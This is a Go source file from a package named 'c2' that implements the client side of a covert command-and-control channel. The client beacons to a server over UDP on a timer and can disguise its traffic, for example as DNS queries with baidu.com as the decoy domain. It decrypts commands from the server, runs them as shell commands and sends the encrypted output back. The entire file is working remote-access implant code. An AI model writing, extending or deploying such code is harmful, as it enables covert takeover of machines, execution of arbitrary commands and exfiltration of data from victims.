package c2

import (
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"time"

	"github.com/b1gcat/core/pki"
	"github.com/b1gcat/core/shellexec"
	"github.com/sirupsen/logrus"
)

// Client represents a UDP client
type Client struct {
	config *Config
	conn   *net.UDPConn
	stopCh chan struct{}
}

// NewClient creates a new UDP client with the given options
func NewClient(opts ...Option) (*Client, error) {
	config := &Config{
		Key:      make([]byte, 16), // Default 16-byte key
		Address:  "localhost:9001", // Default server address
		Interval: 30 * time.Second, // Default 30 seconds interval
		Protocol: ProtocolNone,     // Default no obfuscation
		Domain:   "baidu.com",      // Default DNS domain
		Logger:   logrus.New(),     // Default logger
	}

	for _, opt := range opts {
		opt(config)
	}

	if len(config.Key) != 16 {
		return nil, fmt.Errorf("client: key must be 16 bytes long")
	}

	if config.Identifier == "" {
		config.Identifier = "default-client"
	}

	// Parse server address
	addr, err := net.ResolveUDPAddr("udp", config.Address)
	if err != nil {
		return nil, fmt.Errorf("client: failed to resolve UDP address: %w", err)
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return nil, fmt.Errorf("client: failed to create UDP connection: %w", err)
	}

	return &Client{
		config: config,
		conn:   conn,
		stopCh: make(chan struct{}),
	}, nil
}

// WithClientKey sets the encryption key for the client
func WithClientKey(key string) Option {
	return func(cfg *Config) {
		cfg.Key = []byte(key)
	}
}

// WithClientAddress sets the server address for the client
func WithClientAddress(address string) Option {
	return func(cfg *Config) {
		cfg.Address = address
	}
}

// WithClientIdentifier sets the client identifier
func WithClientIdentifier(identifier string) Option {
	return func(cfg *Config) {
		cfg.Identifier = identifier
	}
}

// WithClientInterval sets the probe interval
func WithClientInterval(interval time.Duration) Option {
	return func(cfg *Config) {
		cfg.Interval = interval
	}
}

// WithClientProtocol sets the protocol obfuscation type
func WithClientProtocol(protocol ProtocolType) Option {
	return func(cfg *Config) {
		cfg.Protocol = protocol
	}
}

// WithClientDomain sets the domain for DNS protocol obfuscation
func WithClientDomain(domain string) Option {
	return func(cfg *Config) {
		cfg.Domain = domain
	}
}

// WithClientLogger sets the logger for client output
func WithClientLogger(logger *logrus.Logger) Option {
	return func(cfg *Config) {
		cfg.Logger = logger
	}
}

// Start begins the client's probe cycle
func (c *Client) Start() error {
	defer c.conn.Close()

	for {
		select {
		case <-c.stopCh:
			return nil
		default:
			if err := c.sendProbe(); err != nil {
				c.config.Logger.Debugf("Client failed to send probe: %v", err)
			}
			if err := c.receiveResponse(); err != nil {
				c.config.Logger.Debugf("Client failed to receive response: %v", err)
			}
			time.Sleep(c.config.Interval)
		}
	}
}

// Stop terminates the client
func (c *Client) Stop() {
	close(c.stopCh)
}

func (c *Client) sendProbe() error {
	// Create probe message
	msg := Message{
		Type:       MessageTypeProbe,
		Identifier: c.config.Identifier,
	}

	// Encode message
	var buf bytes.Buffer
	en := gob.NewEncoder(&buf)
	if err := en.Encode(msg); err != nil {
		return fmt.Errorf("client: failed to encode probe message: %w", err)
	}

	// Apply protocol obfuscation if configured
	data := buf.Bytes()
	if c.config.Protocol != ProtocolNone {
		wrapper := GetProtocolWrapper(c.config.Protocol, c.config.Domain)
		if wrapper != nil {
			var err error
			data, err = wrapper.Wrap(data)
			if err != nil {
				return fmt.Errorf("client: failed to wrap probe message: %w", err)
			}
		}
	}

	// Send message
	_, err := c.conn.Write(data)
	if err != nil {
		return fmt.Errorf("client: failed to write probe message: %w", err)
	}

	return nil
}

func (c *Client) receiveResponse() error {
	// Set read deadline
	c.conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// Buffer for response
	buf := make([]byte, 1024)
	n, err := c.conn.Read(buf)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			// Timeout is expected if no command is pending
			return nil
		}
		return fmt.Errorf("client: failed to read response: %w", err)
	}

	// Apply protocol deobfuscation if configured
	data := buf[:n]
	if c.config.Protocol != ProtocolNone {
		wrapper := GetProtocolWrapper(c.config.Protocol, c.config.Domain)
		if wrapper != nil {
			var err error
			data, err = wrapper.Unwrap(data)
			if err != nil {
				return fmt.Errorf("client: failed to unwrap response: %w", err)
			}
		}
	}

	// Decode message
	var msg Message
	dec := gob.NewDecoder(bytes.NewReader(data))
	if err := dec.Decode(&msg); err != nil {
		return fmt.Errorf("client: failed to decode response: %w", err)
	}

	// Handle message based on type
	switch msg.Type {
	case MessageTypeCommand:
		return c.handleCommand(msg.Payload)
	default:
		return fmt.Errorf("client: unknown message type: %d", msg.Type)
	}
}

func (c *Client) handleCommand(encryptedCmd []byte) error {
	// Decrypt command
	decryptedCmd, err := pki.Decrypt(c.config.Key, encryptedCmd)
	if err != nil {
		return fmt.Errorf("client: failed to decrypt command: %w", err)
	}

	cmdStr := string(decryptedCmd)
	// Logging handled through configured logger
	c.config.Logger.Debugf("Client received command: %s", cmdStr)

	// Execute command with 10-second timeout
	result := "result:"
	var output *string
	var execErr error

	// Create a channel to receive the execution result
	done := make(chan struct{})

	go func() {
		defer close(done)
		output, execErr = shellexec.Exec(cmdStr)
	}()

	// Wait for execution to complete or timeout
	select {
	case <-done:
		// Command completed within timeout
		if execErr != nil {
			output = &result
			*output += "Command execution error: " + execErr.Error() + " (timeout: 10s)"
		} else {
			*output = result + *output
		}
	case <-time.After(10 * time.Second):
		// Command timed out
		output = &result
		*output += "Command execution timed out after 10 seconds"
	}

	// Encrypt result
	encryptedResult, err := pki.Encrypt(c.config.Key, []byte(*output))
	if err != nil {
		return fmt.Errorf("client: failed to encrypt result: %w", err)
	}

	// Send result back
	resultMsg := Message{
		Type:       MessageTypeResult,
		Identifier: c.config.Identifier,
		Payload:    encryptedResult,
	}

	// Encode message
	var buf bytes.Buffer
	en := gob.NewEncoder(&buf)
	if err := en.Encode(resultMsg); err != nil {
		return fmt.Errorf("client: failed to encode result message: %w", err)
	}

	// Apply protocol obfuscation if configured
	data := buf.Bytes()
	if c.config.Protocol != ProtocolNone {
		wrapper := GetProtocolWrapper(c.config.Protocol, c.config.Domain)
		if wrapper != nil {
			var err error
			data, err = wrapper.Wrap(data)
			if err != nil {
				return fmt.Errorf("client: failed to wrap result message: %w", err)
			}
		}
	}

	// Send message
	_, err = c.conn.Write(data)
	if err != nil {
		return fmt.Errorf("client: failed to send result: %w", err)
	}

	return nil
}
